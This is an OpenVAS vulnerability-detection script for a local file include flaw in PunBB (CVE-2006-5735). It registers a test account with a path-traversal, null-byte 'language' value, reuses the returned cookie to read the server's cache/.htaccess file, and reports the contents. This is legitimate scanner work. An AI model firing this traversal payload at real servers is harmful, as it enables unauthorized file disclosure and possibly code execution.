###############################################################################
# OpenVAS Vulnerability Test
# $Id: punbb_register_lfi.nasl 10702 2018-08-01 08:27:30Z cfischer $
#
# PunBB language Parameter Local File Include Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80080");
  script_version("$Revision: 10702 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-01 10:27:30 +0200 (Wed, 01 Aug 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-5735");
  script_bugtraq_id(20786);
  script_name("PunBB language Parameter Local File Include Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("punBB_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("punBB/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/450055/30/0/threaded");
  script_xref(name:"URL", value:"http://forums.punbb.org/viewtopic.php?id=13496");

  script_tag(name:"solution", value:"Update to version 1.2.14 or later.");

  script_tag(name:"summary", value:"The remote web server contains the PHP script PunBB that is
  affected by a local file include issue.");

  script_tag(name:"insight", value:"The version of PunBB installed on the remote host fails to sanitize
  input to the 'language' parameter before storing it in the 'register.php' script as a user's preferred
  language setting.");

  script_tag(name:"impact", value:"By registering with a specially-crafted value, an attacker can leverage
  this issue to view arbitrary files and possibly execute arbitrary code on the affected host.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
dir = matches[2];
install = dir;
if (dir == "/") dir = "";

#
#
#	Begin by posting a registration request with a language parameter set to our local file we want to include.
#	We use the following for username/password in an attempt to be unique:
#


file = "../cache/.htaccess";
username = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
password = unixtime();
email = string(username, "@example.com");
url = string("form_sent=1&req_username=",username,"&req_password1=",password,"&req_password2=",password,"&req_email1=",email,"&timezone=0&language=",file,"%00&email_setting=1&save_pass=1");
registeruser = http_post(port:port,item:string(dir,"/register.php"),data:url);
registeruser = ereg_replace(string:registeruser, pattern:"Content-Length: ", replace: string("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: "));
reg_response = http_keepalive_send_recv(port:port, data: registeruser, bodyonly:FALSE);
if(isnull(reg_response) || "punbb_cookie=" >!< reg_response) exit(0);

#
#
#	Let's grab the cookie sent back with the poisoned language variable and use it to authenticate and check the local file include.
#
#


punbb_cookie = egrep(pattern:"Set-Cookie: punbb_cookie=[a-zA-Z0-9%]*", string:reg_response);
if("expires" >< punbb_cookie) {
	punbb_cookie = punbb_cookie - strstr(punbb_cookie,"expires");
	punbb_cookie = ereg_replace(string:punbb_cookie,pattern:"Set-Cookie",replace:"Cookie");
}
if(isnull(punbb_cookie)) exit(0);


#
#
#	Now verify that we can read the contents of the file.
#
#


	attackreq = http_get(item:string(dir, "/index.php"),port:port);
	attackreq = ereg_replace(string:attackreq,pattern:"Accept:",replace:punbb_cookie,"\r\nAccept:");
	attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
	if(isnull(attackres)) exit(0);


#
#
#	Report output for plugin
#
#


htaccess = "";

if("<Limit GET POST PUT>" >< attackres) {
	htaccess = attackres;

	if("There is no valid language pack" >< htaccess) htaccess = htaccess - strstr(htaccess,"There is no valid language pack");
}

if (htaccess) {
	info = string("The version of PunBB installed in directory '", install, "'\n",
	"is vulnerable to this issue. Here is the contents of 'cache/.htaccess'\n",
	"from the remote host: \n\n", htaccess);

	security_message(data:info, port:port);
}
}
